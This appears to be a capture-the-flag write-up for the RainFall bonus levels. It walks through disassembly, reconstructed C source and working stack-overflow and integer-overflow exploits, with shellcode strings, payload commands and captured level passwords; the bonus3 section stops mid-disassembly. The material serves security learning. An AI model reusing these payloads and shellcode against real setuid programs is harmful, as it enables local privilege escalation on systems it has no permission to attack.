
# /dev/log for rainfall bonus

[Toc]

## bonus0
Here is the objdump for the program
```
080484b4 <p>:
 80484b4:       55                      push   ebp
 80484b5:       89 e5                   mov    ebp,esp
 80484b7:       81 ec 18 10 00 00       sub    esp,0x1018
 80484bd:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484c0:       89 04 24                mov    DWORD PTR [esp],eax
 80484c3:       e8 e8 fe ff ff          call   80483b0 <puts@plt>
 80484c8:       c7 44 24 08 00 10 00    mov    DWORD PTR [esp+0x8],0x1000
 80484cf:       00
 80484d0:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484d6:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484da:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80484e1:       e8 9a fe ff ff          call   8048380 <read@plt>
 80484e6:       c7 44 24 04 0a 00 00    mov    DWORD PTR [esp+0x4],0xa
 80484ed:       00
 80484ee:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484f4:       89 04 24                mov    DWORD PTR [esp],eax
 80484f7:       e8 d4 fe ff ff          call   80483d0 <strchr@plt>
 80484fc:       c6 00 00                mov    BYTE PTR [eax],0x0
 80484ff:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 8048505:       c7 44 24 08 14 00 00    mov    DWORD PTR [esp+0x8],0x14
 804850c:       00
 804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048511:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048514:       89 04 24                mov    DWORD PTR [esp],eax
 8048517:       e8 d4 fe ff ff          call   80483f0 <strncpy@plt>
 804851c:       c9                      leave
 804851d:       c3                      ret

0804851e <pp>:
 804851e:       55                      push   ebp
 804851f:       89 e5                   mov    ebp,esp
 8048521:       57                      push   edi
 8048522:       53                      push   ebx
 8048523:       83 ec 50                sub    esp,0x50
 8048526:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 804852d:       08
 804852e:       8d 45 d0                lea    eax,[ebp-0x30]
 8048531:       89 04 24                mov    DWORD PTR [esp],eax
 8048534:       e8 7b ff ff ff          call   80484b4 <p>
 8048539:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 8048540:       08
 8048541:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048544:       89 04 24                mov    DWORD PTR [esp],eax
 8048547:       e8 68 ff ff ff          call   80484b4 <p>
 804854c:       8d 45 d0                lea    eax,[ebp-0x30]
 804854f:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048553:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048556:       89 04 24                mov    DWORD PTR [esp],eax
 8048559:       e8 42 fe ff ff          call   80483a0 <strcpy@plt>
 804855e:       bb a4 86 04 08          mov    ebx,0x80486a4
 8048563:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048566:       c7 45 c4 ff ff ff ff    mov    DWORD PTR [ebp-0x3c],0xffffffff
 804856d:       89 c2                   mov    edx,eax
 804856f:       b8 00 00 00 00          mov    eax,0x0
 8048574:       8b 4d c4                mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:       89 d7                   mov    edi,edx
 8048579:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804857b:       89 c8                   mov    eax,ecx
 804857d:       f7 d0                   not    eax
 804857f:       83 e8 01                sub    eax,0x1
 8048582:       03 45 08                add    eax,DWORD PTR [ebp+0x8]
 8048585:       0f b7 13                movzx  edx,WORD PTR [ebx]
 8048588:       66 89 10                mov    WORD PTR [eax],dx
 804858b:       8d 45 e4                lea    eax,[ebp-0x1c]
 804858e:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048592:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048595:       89 04 24                mov    DWORD PTR [esp],eax
 8048598:       e8 f3 fd ff ff          call   8048390 <strcat@plt>
 804859d:       83 c4 50                add    esp,0x50
 80485a0:       5b                      pop    ebx
 80485a1:       5f                      pop    edi
 80485a2:       5d                      pop    ebp
 80485a3:       c3                      ret

080485a4 <main>:
 80485a4:       55                      push   ebp
 80485a5:       89 e5                   mov    ebp,esp
 80485a7:       83 e4 f0                and    esp,0xfffffff0
 80485aa:       83 ec 40                sub    esp,0x40
 80485ad:       8d 44 24 16             lea    eax,[esp+0x16]
 80485b1:       89 04 24                mov    DWORD PTR [esp],eax
 80485b4:       e8 65 ff ff ff          call   804851e <pp>
 80485b9:       8d 44 24 16             lea    eax,[esp+0x16]
 80485bd:       89 04 24                mov    DWORD PTR [esp],eax
 80485c0:       e8 eb fd ff ff          call   80483b0 <puts@plt>
 80485c5:       b8 00 00 00 00          mov    eax,0x0
 80485ca:       c9                      leave
 80485cb:       c3                      ret
 80485cc:       90                      nop
 80485cd:       90                      nop
 80485ce:       90                      nop
 80485cf:       90                      nop
```

The source code can be deduced like so:
```clike=
#include <stdio.h>
#include <string.h>

// 080484b4 
void p(char* str1, char* str2)
{
    char p_buf[4104];
    char *newline;
    
    puts(str2);
    
    // 80484e1
    read(0, p_buf, 4096);
    
    // 80484f7
    newline = strchr(p_buf, '\n');
    
    // 80484fc
    *newline = 0;
    
    // 8048517
    strncpy(str1, p_buf, 20);
}

// 0804851e 
void pp(char *str)
{
    char ppbuf1[20];
    char ppbuf2[20];
    
    p(ppbuf1, " - ");
    p(ppbuf2, " - ");
    
    // 8048559
    strcpy(str, pp_buf1);
    
    // 8048579 
    str[strlen(str)] = 32;
    
    // 8048598
    strcat(str, ppbuf2);
    return ;
}

int main()
{
    char res[42];
    pp(res);
    puts(res);
    return 0;
}

```
On the surface, it looks like the `newline = strchr(p_buf, '\n');` line will break the program because the read might return string without newline, which will cause `strchr` not be able to place a nullbyte. **I am not sure what happens next, so we need to test.**

~~This may affect the `strcpy` call at `pp` later on to unintentionally copy other memory into the `str` variable, which may cause overflow since our `str` variable only allocates up to 42 bytes.~~

To test, I have set up the test environment command using fifo since the program needs to read two times from different streams. */tmp/input1* will contain the string for the first read() and */tmp/input2* will contain the string for the second read().

```
mkfifo /tmp/input1ff
mkfifo /tmp/input2ff

python -c "print 'B' * 4097" > /tmp/input1
python -c "print 'A' * 4097" > /tmp/input2

./bonus0 < /tmp/input1ff
cat /tmp/input1 - > /tmp/input1ff < /tmp/input2ff
cat /tmp/input2 > /tmp/input2ff
```


The following is taken after the first read() call, where you are able to see it started and ended at expected locations

![image](https://hackmd.io/_uploads/S1WrVlzL6.png)

As we approach the `strchr` part, we are not able to locate a `\n`, hence it returns 0x0 which will be derefrenced by the next instruction and causes a segfault. Hence, we will change our input files to be able to be searched by strchr. 

```
python -c "print 'B' * 12 + '\n'" > /tmp/input1
python -c "print 'A' * 12" > /tmp/input2
```

I also saw the manpage for strncmp and it says
> Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.

So Im expecting to see an unterminated string in `ppbuf1` at the end since the pointer found by `strchr` will be > 20 and strncmp only copies up to 20 bytes, excluding the nullbyte. The following is the layout of `ppbuf1` after the strncpy with a long input

![image](https://hackmd.io/_uploads/Byr1vxGIa.png)

Now lets try to have a valid input and verify the latter. As we can see, we have a nullbyte at the end, and we are able to express the value as a string.

![image](https://hackmd.io/_uploads/SyvVDxG8T.png)

Since the program is executing normally, I wanted to see the layout of memory before strcpy in pp occurs. Since we are able to make it so that `ppbuf1` does not have a nullbyte, I wonder where does the string ends in this case. As we can see, under normal circumstances, `ppbuf1` and `ppbuf2` are quite close to each other.
![image](https://hackmd.io/_uploads/H1qM3eG8a.png)

As we can see, we are quite close to the EIP that we can overwrite to change the return address, so lets try and figure out if there is a method we can do to reach there. Currently, the `ppbuf1` array is 52 bytes away to reach the saved EIP, however our max size we can get is 40 (ppbuf1 + ppbuf2) .

![image](https://hackmd.io/_uploads/rkd-0xMU6.png)

We can try to maximaize our current buffers, to observe the result using the inputs below

```
python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 19" > /tmp/input2
```

As we can see, we ended right above the ebp with the inputs maxed out
![image](https://hackmd.io/_uploads/Sk5Fk-z8a.png)

However, I do notice that we have a strcat afterwards, which add to **the buffer from the main** function ; `res`. This implies that instead of trying to overwrite to the saved EIP of the `pp()` function. Which as you can see, already has our EIP overwritten.

![image](https://hackmd.io/_uploads/SJZLHWGLp.png)

Looking at the information, looks like the saved EIP is located at `0xbffff72c`, which is mapped to the last 6th character of our second input, lets verfy that using the new input
```
python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 14 + 'BBBB' + 'A'" > /tmp/input2
```

And as you can see, we manage to find the offset to the saved EIP
![image](https://hackmd.io/_uploads/H12NP-G8a.png)


Now for the actual shellcode, I used the one I generated previously and export it as an environment variable because there is no complicated argv calculations needed
```
export SHELLCODE=`python -c "print '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'"`
```

I also get the address of the environment variable using a small program
```clike=
// getenv.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
         }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

```
bonus0@RainFall:/tmp$ gcc getenv.c -o getenv && env -i PATH=$PATH SHELLCODE=$SHELLCODE ./getenv SHELLCODE ./bonus0
SHELLCODE will be at 0xbfffffd8
```

With the information, i will change the input and launch using the following 

```
mkfifo /tmp/input1ff
mkfifo /tmp/input2ff

python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 14 + '\xbf\xff\xff\xd8'[::-1] + 'A'" > /tmp/input2

env -i PATH=$PATH SHELLCODE=$SHELLCODE ./bonus0 < /tmp/input1ff
clear; cat /tmp/input1 - > /tmp/input1ff < /tmp/input2ff
clear; cat /tmp/input2 > /tmp/input2ff
```
Cant spawn the shell but got no errors, I try to combine the inputs together without FIFO since I dont need GDB anymore

```
bonus0@RainFall:~$ (cat /tmp/input1; cat /tmp/input2; cat) |  env -i PATH=$PATH SHELLCODE=$SHELLCODE ./bonus0
 -
 -
BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAA����A AAAAAAAAAAAAAA����A
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

our password is `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## bonus1
Here is the objdump for bonus1
```
08048424 <main>:
 8048424:       55                      push   ebp
 8048425:       89 e5                   mov    ebp,esp
 8048427:       83 e4 f0                and    esp,0xfffffff0
 804842a:       83 ec 40                sub    esp,0x40
 804842d:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048430:       83 c0 04                add    eax,0x4
 8048433:       8b 00                   mov    eax,DWORD PTR [eax]
 8048435:       89 04 24                mov    DWORD PTR [esp],eax
 8048438:       e8 23 ff ff ff          call   8048360 <atoi@plt>
 804843d:       89 44 24 3c             mov    DWORD PTR [esp+0x3c],eax
 8048441:       83 7c 24 3c 09          cmp    DWORD PTR [esp+0x3c],0x9
 8048446:       7e 07                   jle    804844f <main+0x2b>
 8048448:       b8 01 00 00 00          mov    eax,0x1
 804844d:       eb 54                   jmp    80484a3 <main+0x7f>
 804844f:       8b 44 24 3c             mov    eax,DWORD PTR [esp+0x3c]
 8048453:       8d 0c 85 00 00 00 00    lea    ecx,[eax*4+0x0]
 804845a:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804845d:       83 c0 08                add    eax,0x8
 8048460:       8b 00                   mov    eax,DWORD PTR [eax]
 8048462:       89 c2                   mov    edx,eax
 8048464:       8d 44 24 14             lea    eax,[esp+0x14]
 8048468:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
 804846c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048470:       89 04 24                mov    DWORD PTR [esp],eax
 8048473:       e8 a8 fe ff ff          call   8048320 <memcpy@plt>
 8048478:       81 7c 24 3c 46 4c 4f    cmp    DWORD PTR [esp+0x3c],0x574f4c46
 804847f:       57
 8048480:       75 1c                   jne    804849e <main+0x7a>
 8048482:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
 8048489:       00
 804848a:       c7 44 24 04 80 85 04    mov    DWORD PTR [esp+0x4],0x8048580
 8048491:       08
 8048492:       c7 04 24 83 85 04 08    mov    DWORD PTR [esp],0x8048583
 8048499:       e8 b2 fe ff ff          call   8048350 <execl@plt>
 804849e:       b8 00 00 00 00          mov    eax,0x0
 80484a3:       c9                      leave
 80484a4:       c3                      ret
 80484a5:       90                      nop
 80484a6:       90                      nop
 80484a7:       90                      nop
 80484a8:       90                      nop
 80484a9:       90                      nop
 80484aa:       90                      nop
 80484ab:       90                      nop
 80484ac:       90                      nop
 80484ad:       90                      nop
 80484ae:       90                      nop
 80484af:       90                      nop
```
```clike=
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    int atoi_ret;
    char buf[40]; // we allocated 64 bytes at 804842a, - atoi_res size (4) - esp offset (20)
    
    // 8048438
    atoi_ret = atoi(argv[1]);
    if (atoi_ret <= 9)
    {
        int len;
        
        // 8048453
        len = atoi_res * 4;
        
        // 8048473
        memcpy(buf, argv[2], len);
        
        if (atoi_ret != 1464814662) // or 0x574f4c46
            return 1;
        else
            execl("/bin/sh", "sh");
    }
    else
        return 1;
}
```

Based on instructions `804843d` and `8048464`, we are able to determine the sizes and position of the `atoi_ret` and the `buf` variables. They are positioned next to each other at `esp + 0x3c` for `atoi_res` and `esp + 0x14` for `buf`. Which means `buf` needs at least 41 bytes to overwrite`atoi_ret`. This is not possible through normal input because we are capped at 9 for the atoi, which makes our max input length `9 * 4 = 36` bytes long when we put the largest possible number.

However, there is not restrictions on the minimum value, which may cause overflow when I multiply the minimum value by 4. As we can see, the length of memcpy is stored in `ecx` when the user inputs `-2000000000 asd`. The system tries to multiply -2000000000 by 4 which resulted in a large positive number, as the real result needs more than 8 bytes to store.

And since we can copy a big length now, we can try to overwrite `atoi_ret` with a `argv[2]` of 41 bytes.
```
-2000000000 `python -c "print 'B' * 41"`
```
![image](https://hackmd.io/_uploads/r1bRMiM8T.png)

Now to really determine how big of a string we want to copy. Through some trials I observed the overflow wraps around the `MIN_INT / 4 - n` like so. As we can see, every digit we deduct from MIN_INT, we will deduct 4 from MAX_INT in the output.
When we try `MIN_INT / 2` however, the behaviour changes
```
MIN_INT / 4 - 1 -> MAX_INT - 3
MIN_INT / 4 - 2 -> MAX_INT - 7
MIN_INT / 4 - 3 -> MAX_INT - 11
MIN_INT / 4 - 4 -> MAX_INT - 15
...
...

MIN_INT / 2 -> 0
MIN_INT / 2 + 1 -> 4
MIN_INT / 2 + 2 -> 8
MIN_INT / 2 + 3 -> 12
```
We can use this to slowly adjust our memcpy length to at 64 bytes, which our input needs to be `MIN_INT / 2 + 16` or `
```
-1073741808 `python -c "print 'B' * 41"`
```

As we can see, we successfully overwritten `atoi_res` to our dummy input. Now we have to overwrite it with the desired input which is `0x574f4c46`.
![image](https://hackmd.io/_uploads/BkOytszLa.png)

After changing the input to the one below, 
```
-1073741808 `python -c "print 'B' * 40 + '\x57\x4f\x4c\x46'[::-1]"`
```

We are able to get the password for the next level`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`

![image](https://hackmd.io/_uploads/Hkq1qiMUa.png)

## bonus2
Below is the objdump for bonus2
```
08048484 <greetuser>:
 8048484:       55                      push   ebp
 8048485:       89 e5                   mov    ebp,esp
 8048487:       83 ec 58                sub    esp,0x58
 804848a:       a1 88 99 04 08          mov    eax,ds:0x8049988
 804848f:       83 f8 01                cmp    eax,0x1
 8048492:       74 26                   je     80484ba <greetuser+0x36>
 8048494:       83 f8 02                cmp    eax,0x2
 8048497:       74 50                   je     80484e9 <greetuser+0x65>
 8048499:       85 c0                   test   eax,eax
 804849b:       75 6d                   jne    804850a <greetuser+0x86>
 804849d:       ba 10 87 04 08          mov    edx,0x8048710
 80484a2:       8d 45 b8                lea    eax,[ebp-0x48]
 80484a5:       8b 0a                   mov    ecx,DWORD PTR [edx]
 80484a7:       89 08                   mov    DWORD PTR [eax],ecx
 80484a9:       0f b7 4a 04             movzx  ecx,WORD PTR [edx+0x4]
 80484ad:       66 89 48 04             mov    WORD PTR [eax+0x4],cx
 80484b1:       0f b6 52 06             movzx  edx,BYTE PTR [edx+0x6]
 80484b5:       88 50 06                mov    BYTE PTR [eax+0x6],dl
 80484b8:       eb 50                   jmp    804850a <greetuser+0x86>
 80484ba:       ba 17 87 04 08          mov    edx,0x8048717
 80484bf:       8d 45 b8                lea    eax,[ebp-0x48]
 80484c2:       8b 0a                   mov    ecx,DWORD PTR [edx]
 80484c4:       89 08                   mov    DWORD PTR [eax],ecx
 80484c6:       8b 4a 04                mov    ecx,DWORD PTR [edx+0x4]
 80484c9:       89 48 04                mov    DWORD PTR [eax+0x4],ecx
 80484cc:       8b 4a 08                mov    ecx,DWORD PTR [edx+0x8]
 80484cf:       89 48 08                mov    DWORD PTR [eax+0x8],ecx
 80484d2:       8b 4a 0c                mov    ecx,DWORD PTR [edx+0xc]
 80484d5:       89 48 0c                mov    DWORD PTR [eax+0xc],ecx
 80484d8:       0f b7 4a 10             movzx  ecx,WORD PTR [edx+0x10]
 80484dc:       66 89 48 10             mov    WORD PTR [eax+0x10],cx
 80484e0:       0f b6 52 12             movzx  edx,BYTE PTR [edx+0x12]
 80484e4:       88 50 12                mov    BYTE PTR [eax+0x12],dl
 80484e7:       eb 21                   jmp    804850a <greetuser+0x86>
 80484e9:       ba 2a 87 04 08          mov    edx,0x804872a
 80484ee:       8d 45 b8                lea    eax,[ebp-0x48]
 80484f1:       8b 0a                   mov    ecx,DWORD PTR [edx]
 80484f3:       89 08                   mov    DWORD PTR [eax],ecx
 80484f5:       8b 4a 04                mov    ecx,DWORD PTR [edx+0x4]
 80484f8:       89 48 04                mov    DWORD PTR [eax+0x4],ecx
 80484fb:       8b 4a 08                mov    ecx,DWORD PTR [edx+0x8]
 80484fe:       89 48 08                mov    DWORD PTR [eax+0x8],ecx
 8048501:       0f b7 52 0c             movzx  edx,WORD PTR [edx+0xc]
 8048505:       66 89 50 0c             mov    WORD PTR [eax+0xc],dx
 8048509:       90                      nop
 804850a:       8d 45 08                lea    eax,[ebp+0x8]
 804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048511:       8d 45 b8                lea    eax,[ebp-0x48]
 8048514:       89 04 24                mov    DWORD PTR [esp],eax
 8048517:       e8 54 fe ff ff          call   8048370 <strcat@plt>
 804851c:       8d 45 b8                lea    eax,[ebp-0x48]
 804851f:       89 04 24                mov    DWORD PTR [esp],eax
 8048522:       e8 69 fe ff ff          call   8048390 <puts@plt>
 8048527:       c9                      leave
 8048528:       c3                      ret

08048529 <main>:
 8048529:       55                      push   ebp
 804852a:       89 e5                   mov    ebp,esp
 804852c:       57                      push   edi
 804852d:       56                      push   esi
 804852e:       53                      push   ebx
 804852f:       83 e4 f0                and    esp,0xfffffff0
 8048532:       81 ec a0 00 00 00       sub    esp,0xa0
 8048538:       83 7d 08 03             cmp    DWORD PTR [ebp+0x8],0x3
 804853c:       74 0a                   je     8048548 <main+0x1f>
 804853e:       b8 01 00 00 00          mov    eax,0x1
 8048543:       e9 e8 00 00 00          jmp    8048630 <main+0x107>
 8048548:       8d 5c 24 50             lea    ebx,[esp+0x50]
 804854c:       b8 00 00 00 00          mov    eax,0x0
 8048551:       ba 13 00 00 00          mov    edx,0x13
 8048556:       89 df                   mov    edi,ebx
 8048558:       89 d1                   mov    ecx,edx
 804855a:       f3 ab                   rep stos DWORD PTR es:[edi],eax
 804855c:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804855f:       83 c0 04                add    eax,0x4
 8048562:       8b 00                   mov    eax,DWORD PTR [eax]
 8048564:       c7 44 24 08 28 00 00    mov    DWORD PTR [esp+0x8],0x28
 804856b:       00
 804856c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048570:       8d 44 24 50             lea    eax,[esp+0x50]
 8048574:       89 04 24                mov    DWORD PTR [esp],eax
 8048577:       e8 44 fe ff ff          call   80483c0 <strncpy@plt>
 804857c:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804857f:       83 c0 08                add    eax,0x8
 8048582:       8b 00                   mov    eax,DWORD PTR [eax]
 8048584:       c7 44 24 08 20 00 00    mov    DWORD PTR [esp+0x8],0x20
 804858b:       00
 804858c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048590:       8d 44 24 50             lea    eax,[esp+0x50]
 8048594:       83 c0 28                add    eax,0x28
 8048597:       89 04 24                mov    DWORD PTR [esp],eax
 804859a:       e8 21 fe ff ff          call   80483c0 <strncpy@plt>
 804859f:       c7 04 24 38 87 04 08    mov    DWORD PTR [esp],0x8048738
 80485a6:       e8 d5 fd ff ff          call   8048380 <getenv@plt>
 80485ab:       89 84 24 9c 00 00 00    mov    DWORD PTR [esp+0x9c],eax
 80485b2:       83 bc 24 9c 00 00 00    cmp    DWORD PTR [esp+0x9c],0x0
 80485b9:       00
 80485ba:       74 5c                   je     8048618 <main+0xef>
 80485bc:       c7 44 24 08 02 00 00    mov    DWORD PTR [esp+0x8],0x2
 80485c3:       00
 80485c4:       c7 44 24 04 3d 87 04    mov    DWORD PTR [esp+0x4],0x804873d
 80485cb:       08
 80485cc:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
 80485d3:       89 04 24                mov    DWORD PTR [esp],eax
 80485d6:       e8 85 fd ff ff          call   8048360 <memcmp@plt>
 80485db:       85 c0                   test   eax,eax
 80485dd:       75 0c                   jne    80485eb <main+0xc2>
 80485df:       c7 05 88 99 04 08 01    mov    DWORD PTR ds:0x8049988,0x1
 80485e6:       00 00 00
 80485e9:       eb 2d                   jmp    8048618 <main+0xef>
 80485eb:       c7 44 24 08 02 00 00    mov    DWORD PTR [esp+0x8],0x2
 80485f2:       00
 80485f3:       c7 44 24 04 40 87 04    mov    DWORD PTR [esp+0x4],0x8048740
 80485fa:       08
 80485fb:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
 8048602:       89 04 24                mov    DWORD PTR [esp],eax
 8048605:       e8 56 fd ff ff          call   8048360 <memcmp@plt>
 804860a:       85 c0                   test   eax,eax
 804860c:       75 0a                   jne    8048618 <main+0xef>
 804860e:       c7 05 88 99 04 08 02    mov    DWORD PTR ds:0x8049988,0x2
 8048615:       00 00 00
 8048618:       89 e2                   mov    edx,esp
 804861a:       8d 5c 24 50             lea    ebx,[esp+0x50]
 804861e:       b8 13 00 00 00          mov    eax,0x13
 8048623:       89 d7                   mov    edi,edx
 8048625:       89 de                   mov    esi,ebx
 8048627:       89 c1                   mov    ecx,eax
 8048629:       f3 a5                   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
 804862b:       e8 54 fe ff ff          call   8048484 <greetuser>
 8048630:       8d 65 f4                lea    esp,[ebp-0xc]
 8048633:       5b                      pop    ebx
 8048634:       5e                      pop    esi
 8048635:       5f                      pop    edi
 8048636:       5d                      pop    ebp
 8048637:       c3                      ret
 8048638:       90                      nop
 8048639:       90                      nop
 804863a:       90                      nop
 804863b:       90                      nop
 804863c:       90                      nop
 804863d:       90                      nop
 804863e:       90                      nop
 804863f:       90                      nop
 ```
The `rep stos DWORD PTR es:[edi],eax` instruction sequence in assembly** language is used to fill a block of memory with a specific value**, similar to memset in C.

This line will read the ecx register, and it will repeat itself and decrement the ecx register based on direction flags. While in an iteration, it takes the value in eax and stores it in whatever is pointer to in edi. the es will also be increment or decremented as it is a segment selector, which adjusts the offset when accessing edi. Ommiting on `es:` part will still produce the same output since moden systems dont use segmentation. It is placed there for backwards compatibility.

The rep prefix stands for "repeat". It causes the following instruction to be repeated the number of times specified in the ecx register. The stos instruction stands for "store string". It stores the value in the eax register into the location pointed to by the edi register. The DWORD PTR keyword indicates that the size of the data being stored is a double word (4 bytes in 32-bit systems). After the store operation, the edi register is incremented or decremented by 4 bytes, depending on the direction flag

The source code can be deduced like so
```clike=
#include <string.h>
#include <stdio.h>
    
static int language;

// 08048484 
void greetuser(char *name)
{
    // 80484a2
    char greeting[72]; 
    
    if (language == 1)
        strcpy(greeting, "Hyvää päivää ");
    else if (language == 2)
        strcpy(greeting, "Goedemiddag! ");
    else if (language == 0)
        strcpy(greeting, "Hello! ");

    // 8048370
    strcat(greeting, name);
    
    // 8048522
    puts(greeting);    
}

int main(int argc, char **argv)
{    
    if (argc == 3)
    {
        char buf[76];// 9c - 50
        char *lang_str;
        
        // 804855a
        memset(buf, 0, (19 * 4));
        
        // 8048577
        strncpy(buf, argv[1], 40);
        
        // 804859a
        strncpy(buf + 40, argv[2], 32);
        
        // 80485a6
        lang_str = getenv("LANG");
        if (!lang_str)
        {
            greetuser(buf);
            return 0;
        }
        else
        {
            if (memcmp(lang_str, "fi", 2) == 0)
                language = 1;
            else if (memcmp(lang_str, "nl", 2) == 0)
                language = 2;
            greetuser(buf);
            return 0;
        }
    }
    else 
        return 1;
}
```
I noticed at the getuser function, the size of the greeting buffer might not be enough to fit the result of strcat due to the **size of buffer is 72** but the second argument of the strcat can go up to 76 bytes. Combined with the greeting string, greeting buffer will surely overflow. As we can see, below is the memory layout after strcat is called in greetuser. our buffer ends at `0xbffff626` and the ebp starts at `0xbffff628`.
![image](https://hackmd.io/_uploads/B1pvO0G8a.png)

As you can see, we did actually overwrite the saved EIP by extending the input. However, this is the max we are able to go for now since the `buf` at main is well `memset'd` and we cant change that. However, we are able to change the lang env var in order to extend our buffer.
![image](https://hackmd.io/_uploads/r1w4jRGLp.png)

As you can seem after I do `export LANG=nl` and adjusted the input to `python -c "print 'B' * 40"` `python -c "print 'A' * 28 + 'CCCC'"` I am able to overwrite the return address of `greetuser` to `CCCC`
![image](https://hackmd.io/_uploads/Syd_nCfIp.png)

Now to generate the payload, I exported the shellcode with a NOP sled as an environment variable 
```
 export SHELLCODE=`python -c "print '\x90' * 4200 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'"`
```

Now I need to determine the address of the variable when I launch my program, I went to GDB and inspected the address and got `0xbfffe872`

![image](https://hackmd.io/_uploads/SykSAkXLa.png)

I changed my inputs to `python -c "print 'B' * 40"` `python -c "print 'A' * 23 + '\xbf\xff\xe8\x82'[::-1]"` and I got a shell. The password for the next user is `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`

![image](https://hackmd.io/_uploads/SyeiJg7Ua.png)

## bonus3
Below is the objdump for bonus3

```
080484f4 <main>:
 80484f4:       55                      push   ebp
 80484f5:       89 e5                   mov    ebp,esp
 80484f7:       57                      push   edi
 80484f8:       53                      push   ebx
 80484f9:       83 e4 f0                and    esp,0xfffffff0
 80484fc:       81 ec a0 00 00 00       sub    esp,0xa0
 8048502:       ba f0 86 04 08          mov    edx,0x80486f0
 8048507:       b8 f2 86 04 08          mov    eax,0x80486f2
 804850c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048510:       89 04 24                mov    DWORD PTR [esp],eax
 8048513:       e8 f8 fe ff ff          call   8048410 <fopen@plt>
 8048518:       89 84 24 9c 00 00 00    mov    DWORD PTR [esp+0x9c],eax
 804851f:       8d 5c 24 18             lea    ebx,[esp+0x18]
 8048523:       b8 00 00 00 00          mov    eax,0x0
 8048528:       ba 21 00 00 00          mov    edx,0x21
 804852d:       89 df                   mov    edi,ebx
 804852f:       89 d1                   mov    ecx,edx
 8048531:       f3 ab                   rep stos DWORD PTR es:[edi],eax
 8048533:       83 bc 24 9c 00 00 00    cmp    DWORD PTR [esp+0x9c],0x0
 804853a:       00
 804853b:       74 06                   je     8048543 <main+0x4f>
 804853d:       83 7d 08 02             cmp    DWORD PTR [ebp+0x8],0x2
 8048541:       74 0a                   je     804854d <main+0x59>
 8048543:       b8 ff ff ff ff          mov    eax,0xffffffff
 8048548:       e9 c8 00 00 00          jmp    8048615 <main+0x121>
 804854d:       8d 44 24 18             lea    eax,[esp+0x18]
 8048551:       8b 94 24 9c 00 00 00    mov    edx,DWORD PTR [esp+0x9c]
 8048558:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 804855c:       c7 44 24 08 42 00 00    mov    DWORD PTR [esp+0x8],0x42
 8048563:       00
 8048564:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 804856b:       00
 804856c:       89 04 24                mov    DWORD PTR [esp],eax
 804856f:       e8 5c fe ff ff          call   80483d0 <fread@plt>
 8048574:       c6 44 24 59 00          mov    BYTE PTR [esp+0x59],0x0
 8048579:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804857c:       83 c0 04                add    eax,0x4
 804857f:       8b 00                   mov    eax,DWORD PTR [eax]
 8048581:       89 04 24                mov    DWORD PTR [esp],eax
 8048584:       e8 a7 fe ff ff          call   8048430 <atoi@plt>
 8048589:       c6 44 04 18 00          mov    BYTE PTR [esp+eax*1+0x18],0x0
 804858e:       8d 44 24 18             lea    eax,[esp+0x18]
 8048592:       8d 50 42                lea    edx,[eax+0x42]
 8048595:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
